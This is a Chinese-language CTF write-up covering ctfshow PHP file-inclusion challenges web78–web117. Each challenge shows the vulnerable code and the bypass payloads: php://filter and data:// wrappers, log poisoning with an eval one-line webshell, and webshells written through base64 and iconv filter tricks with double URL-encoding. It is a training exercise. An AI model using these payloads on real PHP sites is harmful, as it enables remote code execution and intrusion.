## 文件包含

### web78

```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);
}else{
    highlight_file(__FILE__);
}
```

```
php://filter/convert.base64-encode/resource=flag.php
data://text/plain,<?php system('cat flag.php');?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==
```

### web79

```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

这里会把php字符替换成???，造成payload错误

还可以用短标签和base64加密，如下

```
data://text/plain,<?= system('tac flag.php');?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==
```

### web80

```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

过滤了data协议，还可以用日志包含

通过User-Agent头写入一句话`<?php eval($_POST[1]);?>`，然后包含日志文件

`?file=/var/log/nginx/access.log`

### web81

```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

同样进行日志包含

```
<?php eval($_POST[1]);?>
?file=/var/log/nginx/access.log
```

### web87

```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $content = $_POST['content'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    file_put_contents(urldecode($file), "<?php die('大佬别秀了');?>".$content);
}else{
    highlight_file(__FILE__);
}
```

这里涉及file_put_content函数的利用，参考

[file_put_content和死亡·杂糅代码之缘](https://xz.aliyun.com/t/8163#toc-0)

这里会把die()写入文件，导致后面的代码不能执行，这时候我们将`<?php die('大佬别秀了');?>`进行搅乱从而绕过

```
?file=php://filter/write=convert.base64-decode/resource=3.php
content=<?php @eval($_POST[1]);?>
进行base64编码
content=PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+
```

base64解码时，是4个一组，而`<?php die('大佬别秀了');?>`里只有6个字节，在补充2个字节就行了

```
最终payload
content=66PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==
file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%33%25%32%65%25%37%30%25%36%38%25%37%30
```

因为php被过滤，我们要进行两次url全编码，第一次是过urldecode函数，第二次是有特殊字符会进行解码

![image-20231117150439765](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231117150439765.png)

### web88

```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    if(preg_match("/php|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\-|\_|\+|\=|\./i", $file)){
        die("error");
    }
    include($file);
}else{
    highlight_file(__FILE__);
} 
```

这里过滤了很多字符，还可以用data协议，注意这里过滤了`=`和`+`

payload

```
file=data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==
后面的等号要去掉
```

### web117

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
function filter($x){
    if(preg_match('/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i',$x)){
        die('too young too simple sometimes naive!');
    }
}
$file=$_GET['file'];
$contents=$_POST['contents'];
filter($file);
file_put_contents($file, "<?php die();?>".$contents);
```

[file_put_content和死亡·杂糅代码之缘](https://xz.aliyun.com/t/8163#toc-0)

[iconv函数](https://www.php.net/manual/zh/function.iconv.php)

```php
<?php
echo iconv("UCS-2LE","UCS-2BE",'<?php eval($_POST[1]);?>');
?>
?<hp pvela$(P_SO[T]1;)>?
```

payload

```
file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=1.php
contents=?<hp pvela$(P_SO[T]1;)>?
```

注意：通过usc-2的编码进行转换；对目标字符串进行2位一反转；（因为是两位一反转，所以字符的数目需要保持在偶数位上）
